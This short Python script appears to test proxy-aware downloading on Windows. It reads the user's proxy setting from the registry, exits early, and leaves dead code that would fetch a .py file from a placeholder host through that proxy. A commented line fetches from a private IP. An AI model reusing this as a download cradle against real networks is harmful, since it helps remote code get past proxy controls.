from urllib import request as urlrequest
from winreg import *

Registry = ConnectRegistry(None, HKEY_CURRENT_USER)
regkey = OpenKey(Registry, "Software\Microsoft\Windows\CurrentVersion\Internet Settings")
url='http://LOCAL_IP:LOCAL_PORT/HTTP_22_python3_p_HKCU.py'
#CurrentBuildNumber
print(QueryValueEx(regkey, "ProxyServer")[0])

exit()
proxy_host = QueryValueEx(regkey, "ProxyServer")[0]
req = urlrequest.Request(url)
req.set_proxy(proxy_host, 'http')
urlrequest.urlopen(req).read()

# contents = urllib.request.urlopen('http://192.168.49.133/python3').read()
